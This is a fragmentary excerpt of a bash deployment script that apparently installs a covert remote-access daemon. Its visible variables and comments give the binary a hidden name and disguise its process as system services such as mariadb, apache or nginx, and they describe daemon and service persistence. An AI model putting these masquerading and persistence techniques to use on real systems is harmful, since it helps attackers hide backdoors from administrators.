...
# GS_BIN_HIDDEN_NAME="fcgi-bin"
#       - Specify custom name for binary on filesystem (default is fcgi-bin)
...
BIN_HIDDEN_NAME_DEFAULT="ptacid"
# Can not use '[kcached/0]'. Bash without bashrc shows "/0] $" as prompt. 
proc_name_arr=("[mariadb]" "[sbin]" "[spool]" "[webmin]" "[apache]" "[nginx]" "[prompt]" "[date]" "[year]" "[time_prefix]" "[term]" "[proccess]")
...
BIN_HIDDEN_NAME_RM=("$BIN_HIDDEN_NAME_DEFAULT" "fcgi-bin" "bin-db")
CONFIG_DIR_NAME_RM=("$CONFIG_DIR_NAME" "bin")
...
init_vars()
{
	...
	# 'killall' however matches fcgi-bin and on OSX we thus force killall
	...
	# Defaults
	# Binary file is called fcgi-bin or set to same name as Process name if
...
init_setup()
{
	...
	# Do not add TERM= or SHELL= here because we do not like that to show in fcgi-bin.service
	...
	# 2. Otherwise start fcgi-bin as DAEMON. The daemon will exit (fully) if GS-Address is already in use.
...
gs_start()
{
	...
	# GS_UNDO=1 ./deploy.sh -> removed all binaries but user does not issue 'pkill fcgi-bin'
	# ./deploy.sh -> re-installs new secret. Start fcgi-bin with _new_ secret.
	# Now two fcgi-bin's are running (which is correct)
	if [[ -n "$KL_CMD" ]]; then
